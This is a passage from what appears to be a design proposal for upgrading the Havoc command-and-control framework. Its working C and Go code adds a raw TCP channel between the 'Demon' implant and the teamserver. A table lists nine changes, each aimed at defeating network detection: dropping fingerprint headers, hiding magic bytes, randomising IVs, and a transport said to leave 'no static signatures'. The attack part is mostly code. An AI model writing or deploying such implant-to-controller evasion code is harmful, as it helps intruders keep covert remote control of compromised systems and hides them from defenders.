    Addr.sin_addr.s_addr = Instance->Win32.inet_addr( (PCHAR) Instance->Config.Transport.Host->HostA );

    if ( Instance->Win32.connect( Sock, (struct sockaddr*) &Addr, sizeof( Addr ) ) != 0 )
        goto LEAVE;

    /* Send length-prefixed packet (4-byte big-endian length + payload) */
    UCHAR LenBuf[ 4 ] = { 0 };
    Int32ToBuffer( LenBuf, Send->Length );
    Instance->Win32.send( Sock, (PCHAR) LenBuf,        4,           0 );
    Instance->Win32.send( Sock, (PCHAR) Send->Buffer,  Send->Length, 0 );

    if ( Resp ) {
        /* Read response length */
        Instance->Win32.recv( Sock, (PCHAR) LenBuf, 4, MSG_WAITALL );
        RespSize = ( LenBuf[0] << 24 ) | ( LenBuf[1] << 16 ) | ( LenBuf[2] << 8 ) | LenBuf[3];

        RespBuf = Instance->Win32.LocalAlloc( LPTR, RespSize );
        Instance->Win32.recv( Sock, (PCHAR) RespBuf, RespSize, MSG_WAITALL );

        Resp->Buffer = RespBuf;
        Resp->Length = RespSize;
    }

    Success = TRUE;

LEAVE:
    if ( Sock != INVALID_SOCKET )
        Instance->Win32.closesocket( Sock );
    Instance->Win32.WSACleanup();
    return Success;
}

#endif
```

Add `ws2_32.dll` function resolution to `Win32.c` (`WSAStartup`, `WSASocketW`, `connect`, `send`, `recv`, `htons`, `inet_addr`, `closesocket`, `WSACleanup`).

### Teamserver Side — tcp.go

```go
// teamserver/pkg/handlers/tcp.go (new file)
package handlers

import (
    "encoding/binary"
    "net"
    "Havoc/pkg/logger"
)

func (t *TCP) Start() {
    ln, err := net.Listen("tcp", t.Config.HostBind+":"+t.Config.PortBind)
    if err != nil {
        logger.Error("TCP listener failed: " + err.Error())
        return
    }
    t.Active = true

    pk := t.Teamserver.ListenerAdd("", LISTENER_TCP, t)
    t.Teamserver.EventAppend(pk)
    t.Teamserver.EventBroadcast("", pk)

    go func() {
        for {
            conn, err := ln.Accept()
            if err != nil {
                break
            }
            go t.handleConn(conn)
        }
    }()
}

func (t *TCP) handleConn(conn net.Conn) {
    defer conn.Close()
    ExternalIP := conn.RemoteAddr().(*net.TCPAddr).IP.String()

    // Read 4-byte big-endian length prefix
    var sizeBuf [4]byte
    if _, err := conn.Read(sizeBuf[:]); err != nil {
        return
    }
    size := binary.BigEndian.Uint32(sizeBuf[:])

    body := make([]byte, size)
    if _, err := conn.Read(body); err != nil {
        return
    }

    // Reuse existing HTTP parsing logic
    if Response, ok := parseAgentRequest(t.Teamserver, body, ExternalIP); ok {
        respBytes := Response.Bytes()
        var lenPfx [4]byte
        binary.BigEndian.PutUint32(lenPfx[:], uint32(len(respBytes)))
        conn.Write(lenPfx[:])
        conn.Write(respBytes)
    }
}
```

Add to `teamserver/pkg/handlers/types.go`:

```go
const LISTENER_TCP = "TCP"

type TCP struct {
    Config     TCPConfig
    Active     bool
    Teamserver agent.TeamServer
    Listener   net.Listener
}

type TCPConfig struct {
    Name     string
    HostBind string
    PortBind string
    Hosts    []string
}
```

### Why

Avoids HTTP overhead entirely. Raw TCP with a 4-byte length prefix is indistinguishable from database connections, custom application protocols, or tunnelled traffic. Combining it with the header obfuscation (suggestion 3) and per-request IV (suggestion 4) produces a protocol with no static signatures.

### Other Components That Must Change

- **Profile (`profiles/havoc.yaotl`):** Add a `TCP {}` listener block analogous to the `Listeners { Http {} }` block.
- **Teamserver profile parser (`teamserver/pkg/profile/`):** Parse the new `TCP {}` block and instantiate `handlers.TCP`.
- **Builder (`teamserver/pkg/common/builder/`):** Add `TRANSPORT_TCP` define and TCP-specific config fields (host, port) to the generated Demon config block — the same structure as `TRANSPORT_HTTP` host/port config.
- **Client (`client/src/UserInterface/Widgets/Listeners.cc`):** Add TCP as a listener type option in the UI alongside HTTP and SMB. The listener event packet already carries the listener type string (`LISTENER_TCP`), so the display side requires only a new branch in the type-switch.

---

## Summary Table

| # | Improvement | Detection Problem Solved | Complexity | Scope |
|---|-------------|--------------------------|------------|-------|
| 1 | Remove X-Havoc header | Teamserver listener fingerprint | Trivial | Teamserver only |
| 2 | Base64 HTTP body | Binary POST body anomaly | Low | Demon + Teamserver |
| 3 | Obfuscate outer header | Static 0xDEADBEEF magic at fixed offset | Low | Demon + Teamserver |
| 4 | Per-request random IV | Static/predictable IV, keystream reuse | Low | Demon + Teamserver |
| 5 | Asymmetric key wrapping | AES key sent in plaintext on HTTP | High | Demon + Teamserver + Builder |
| 6 | HMAC-SHA256 authentication | Packet replay, bit-flip attacks | Medium | Demon + Teamserver |
| 7 | Compress before encrypt | Large payload size patterns | Medium | Demon + Teamserver |
| 8 | SMB framing obfuscation | Static DemonID in named pipe stream | Low | Demon (pivot code) |
| 9 | Raw TCP transport | HTTP-only transport limitation | High | Demon + Teamserver + Client + Profile |

**Recommended implementation order:** 1 → 3 → 4 → 2 → 6 → 5 → 7 → 8 → 9.

Start with the high-yield, low-cost changes (1, 3, 4) before the architectural ones (5, 9).
